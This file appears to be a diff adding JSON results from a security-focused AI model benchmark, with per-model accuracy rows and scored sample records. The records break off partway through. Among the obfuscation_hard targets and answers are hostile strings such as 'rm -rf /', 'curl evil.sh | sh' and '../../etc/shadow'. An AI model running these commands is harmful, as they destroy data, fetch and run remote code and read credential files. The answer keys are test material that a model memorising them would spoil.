@@ -1,0 +1,2794 @@
+{
+"rows": [
+{
+"dir": "fpt-smoke",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 162,
+"outtok": 907,
+"rtok": 0
+},
+{
+"dir": "fpt-smoke",
+"model": "openai-api/fptcloud/Qwen3.6-27B",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 212,
+"outtok": 2120,
+"rtok": 0
+},
+{
+"dir": "hard-check",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.9,
+"intok": 597,
+"outtok": 8870,
+"rtok": 0
+},
+{
+"dir": "hard-check",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "obfuscation_hard",
+"status": "started",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "hard-check",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "obfuscation_hard",
+"status": "error",
+"acc": 1.0,
+"intok": 348,
+"outtok": 2403,
+"rtok": 0
+},
+{
+"dir": "hard-check",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "security_reasoning_hard",
+"status": "error",
+"acc": 1.0,
+"intok": 515,
+"outtok": 6713,
+"rtok": 0
+},
+{
+"dir": "hard-check",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "security_reasoning_hard",
+"status": "started",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "hard-check",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "obfuscation_hard",
+"status": "started",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "hard-check",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 334,
+"outtok": 1983,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/qwen3.6-plus",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.8888888888888888,
+"intok": 515,
+"outtok": 14583,
+"rtok": 14522
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.8888888888888888,
+"intok": 393,
+"outtok": 5346,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-pro",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.9,
+"intok": 1286,
+"outtok": 16843,
+"rtok": 15746
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/qwen3.6-plus",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 667,
+"outtok": 16397,
+"rtok": 14398
+},
+{
+"dir": "survey",
+"model": "anthropic/qwen3.7-max",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 587,
+"outtok": 25961,
+"rtok": 12911
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-pro",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.8888888888888888,
+"intok": 1150,
+"outtok": 22693,
+"rtok": 22662
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/glm-5.1",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.8888888888888888,
+"intok": 421,
+"outtok": 14081,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-flash",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.8,
+"intok": 1414,
+"outtok": 21022,
+"rtok": 19849
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-flash",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.6666666666666666,
+"intok": 1150,
+"outtok": 21270,
+"rtok": 21243
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/kimi-k2.6",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 504,
+"outtok": 18213,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/kimi-k2.6",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 635,
+"outtok": 14728,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/Qwen3.6-27B",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.9,
+"intok": 667,
+"outtok": 14494,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-flash",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 954,
+"outtok": 7369,
+"rtok": 7336
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/Qwen3.6-27B",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.8888888888888888,
+"intok": 587,
+"outtok": 18576,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/qwen3.6-plus",
+"task": "code_comprehension",
+"status": "success",
+"acc": 1.0,
+"intok": 244,
+"outtok": 2298,
+"rtok": 2270
+},
+{
+"dir": "survey",
+"model": "anthropic/qwen3.7-max",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 667,
+"outtok": 10911,
+"rtok": 8514
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/glm-5.1",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.9,
+"intok": 277,
+"outtok": 15269,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.9,
+"intok": 597,
+"outtok": 9408,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-pro",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 954,
+"outtok": 3417,
+"rtok": 3384
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/qwen3.6-plus",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 416,
+"outtok": 10233,
+"rtok": 10139
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-flash",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 475,
+"outtok": 586,
+"rtok": 574
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-flash",
+"task": "security_reasoning",
+"status": "success",
+"acc": 0.75,
+"intok": 392,
+"outtok": 2888,
+"rtok": 2466
+},
+{
+"dir": "survey",
+"model": "anthropic/qwen3.7-max",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 416,
+"outtok": 5873,
+"rtok": 3614
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/kimi-k2.6",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 346,
+"outtok": 6098,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/Qwen3.6-27B",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 0.875,
+"intok": 416,
+"outtok": 14658,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "anthropic/qwen3.7-max",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 212,
+"outtok": 1791,
+"rtok": 1033
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-pro",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 475,
+"outtok": 1048,
+"rtok": 1036
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/kimi-k2.6",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 125,
+"outtok": 889,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/glm-5.1",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 334,
+"outtok": 2420,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-pro",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 520,
+"outtok": 2465,
+"rtok": 2057
+},
+{
+"dir": "survey",
+"model": "anthropic/qwen3.7-max",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 227,
+"outtok": 2949,
+"rtok": 2457
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/kimi-k2.6",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 113,
+"outtok": 3285,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/qwen3.6-plus",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 212,
+"outtok": 894,
+"rtok": 868
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/glm-5.1",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 66,
+"outtok": 1008,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 334,
+"outtok": 2136,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/glm-5.1",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 171,
+"outtok": 2630,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/qwen3.6-plus",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 227,
+"outtok": 4292,
+"rtok": 3688
+},
+{
+"dir": "survey",
+"model": "anthropic/qwen3.7-max",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.75,
+"intok": 244,
+"outtok": 2097,
+"rtok": 1698
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/glm-5.1",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.75,
+"intok": 201,
+"outtok": 2597,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-flash",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.75,
+"intok": 510,
+"outtok": 2049,
+"rtok": 2037
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/kimi-k2.6",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.5,
+"intok": 194,
+"outtok": 996,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/opencode/deepseek-v4-pro",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.75,
+"intok": 510,
+"outtok": 641,
+"rtok": 630
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 203,
+"outtok": 3223,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "code_comprehension",
+"status": "success",
+"acc": 1.0,
+"intok": 201,
+"outtok": 1153,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/GLM-5.1",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 162,
+"outtok": 928,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/Qwen3.6-27B",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 227,
+"outtok": 4592,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/Qwen3.6-27B",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 212,
+"outtok": 2018,
+"rtok": 0
+},
+{
+"dir": "survey",
+"model": "openai-api/fptcloud/Qwen3.6-27B",
+"task": "code_comprehension",
+"status": "success",
+"acc": 1.0,
+"intok": 244,
+"outtok": 1798,
+"rtok": 0
+},
+{
+"dir": "zen-smoke",
+"model": "openai-api/opencode/deepseek-v4-flash-free",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 475,
+"outtok": 593,
+"rtok": 581
+},
+{
+"dir": "zen-smoke",
+"model": "openai-api/opencode/glm-5.1",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 162,
+"outtok": 1002,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-6",
+"task": "obfuscation_hard",
+"status": "error",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"status": "error",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-6",
+"task": "obfuscation",
+"status": "error",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning",
+"status": "error",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"status": "error",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension",
+"status": "error",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"status": "started",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning",
+"status": "started",
+"acc": null,
+"intok": 0,
+"outtok": 0,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.8,
+"intok": 591,
+"outtok": 3153,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning",
+"status": "success",
+"acc": 0.75,
+"intok": 199,
+"outtok": 1473,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.8888888888888888,
+"intok": 488,
+"outtok": 1928,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 488,
+"outtok": 1640,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.8,
+"intok": 591,
+"outtok": 3094,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 488,
+"outtok": 854,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.8,
+"intok": 591,
+"outtok": 2363,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 375,
+"outtok": 695,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 375,
+"outtok": 584,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.6666666666666666,
+"intok": 702,
+"outtok": 722,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 375,
+"outtok": 600,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 1018,
+"outtok": 5031,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 175,
+"outtok": 195,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.75,
+"intok": 218,
+"outtok": 204,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 175,
+"outtok": 148,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 501,
+"outtok": 54,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"status": "success",
+"acc": 0.9,
+"intok": 1068,
+"outtok": 2373,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning",
+"status": "success",
+"acc": 0.75,
+"intok": 199,
+"outtok": 886,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"status": "success",
+"acc": 0.5555555555555556,
+"intok": 747,
+"outtok": 58,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 175,
+"outtok": 172,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 276,
+"outtok": 30,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.5,
+"intok": 218,
+"outtok": 280,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"status": "success",
+"acc": 1.0,
+"intok": 541,
+"outtok": 68,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.75,
+"intok": 218,
+"outtok": 584,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning",
+"status": "success",
+"acc": 0.75,
+"intok": 199,
+"outtok": 918,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 338,
+"outtok": 1891,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 256,
+"outtok": 22,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning",
+"status": "success",
+"acc": 1.0,
+"intok": 358,
+"outtok": 844,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.75,
+"intok": 280,
+"outtok": 27,
+"rtok": 0
+},
+{
+"dir": "zen-sota",
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension",
+"status": "success",
+"acc": 0.25,
+"intok": 260,
+"outtok": 16,
+"rtok": 0
+},
+{
+"dir": "zengo-qwen",
+"model": "anthropic/qwen3.7-max",
+"task": "obfuscation",
+"status": "success",
+"acc": 1.0,
+"intok": 212,
+"outtok": 2005,
+"rtok": 1277
+}
+],
+"samples": [
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "obfuscation_hard",
+"id": "obh-001",
+"target": "eval(atob(x))",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "obfuscation_hard",
+"id": "obh-004",
+"target": "rm -rf /",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "obfuscation_hard",
+"id": "obh-006",
+"target": "../../etc/shadow",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"id": "srh-001",
+"target": "vulnerable",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"id": "srh-003",
+"target": "vulnerable",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"id": "srh-005",
+"target": "vulnerable",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"id": "srh-006",
+"target": "safe",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"id": "srh-007",
+"target": "vulnerable",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"id": "srh-008",
+"target": "safe",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"id": "srh-009",
+"target": "vulnerable",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning_hard",
+"id": "srh-010",
+"target": "safe",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "obfuscation",
+"id": "ob-001",
+"target": "hello world",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "obfuscation",
+"id": "ob-003",
+"target": "eval",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning",
+"id": "sr-001",
+"target": "vulnerable",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning",
+"id": "sr-002",
+"target": "safe",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-002",
+"target": "number",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-003",
+"target": "0.30000000000000004",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-004",
+"target": "NaN",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension",
+"id": "cc-001",
+"target": "15",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension",
+"id": "cc-002",
+"target": "O(n^2)",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension",
+"id": "cc-003",
+"target": "2",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension",
+"id": "cc-004",
+"target": "yes",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-001",
+"target": "object",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-002",
+"target": "number",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-003",
+"target": "0.30000000000000004",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-004",
+"target": "NaN",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-005",
+"target": "baNaNa",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-006",
+"target": "[object Object]",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-007",
+"target": "10000000000000000",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "code_comprehension_hard",
+"id": "cch-008",
+"target": "string",
+"answer": "",
+"score": "None"
+},
+{
+"model": "anthropic/claude-opus-4-6",
+"task": "security_reasoning",
+"id": "sr-002",
+"target": "safe",
+"answer": "",
+"score": "None"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-001",
+"target": "vulnerable",
+"answer": "Yes. The recursive merge is vulnerable to prototype pollution.  Example input:  ```json {\"",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-002",
+"target": "vulnerable",
+"answer": "Yes. The regex `/^(a+)+$/` has nested quantifiers (`(a+)+`), which can cause catastrophic ",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-003",
+"target": "vulnerable",
+"answer": "The code is vulnerable because it disables JWT signature verification:  ```python jwt.deco",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-004",
+"target": "safe",
+"answer": "The path normalization and `os.path.commonpath()` check correctly blocks simple `../` trav",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-005",
+"target": "vulnerable",
+"answer": "The code is vulnerable because it fetches a fully user-controlled URL server-side:  ```pyt",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-006",
+"target": "safe",
+"answer": "`yaml.safe_load(user_yaml)` is generally safe against PyYAML arbitrary code execution/dese",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-007",
+"target": "vulnerable",
+"answer": "The code is vulnerable because it stores passwords using unsalted MD5. MD5 is fast and cry",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-008",
+"target": "safe",
+"answer": "Using `subprocess.run()` with a list of arguments and `shell=False` prevents shell metacha",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-009",
+"target": "vulnerable",
+"answer": "The code compares a secret token using `==`, which is not guaranteed to be constant-time. ",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning_hard",
+"id": "srh-010",
+"target": "safe",
+"answer": "The query uses a parameterized placeholder (`?`) and passes `user_id` separately as a boun",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning",
+"id": "sr-001",
+"target": "vulnerable",
+"answer": "The code directly concatenates `user_input` into an SQL query string. If an attacker provi",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning",
+"id": "sr-002",
+"target": "safe",
+"answer": "The code uses a parameterized query: `user_input` is passed separately as a bound paramete",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning",
+"id": "sr-003",
+"target": "vulnerable",
+"answer": "Yes. If `host` contains untrusted input, this is vulnerable to command injection because i",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "security_reasoning",
+"id": "sr-004",
+"target": "safe",
+"answer": "Using a list with `subprocess.run(..., shell=False)` prevents classic shell injection like",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-001",
+"target": "eval(atob(x))",
+"answer": "I'm sorry, but I cannot assist with that request.",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-002",
+"target": "whoami",
+"answer": "whoami",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-003",
+"target": "drop table",
+"answer": "drop table",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-004",
+"target": "rm -rf /",
+"answer": "rm -rf /",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-005",
+"target": "curl evil.sh | sh",
+"answer": "curl evil.sh | sh",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-006",
+"target": "../../etc/shadow",
+"answer": "../../etc/shadow",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-007",
+"target": "/bin/sh",
+"answer": "/bin/sh",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-008",
+"target": "netcat",
+"answer": "netcat",
+"score": "C"
+},
+{
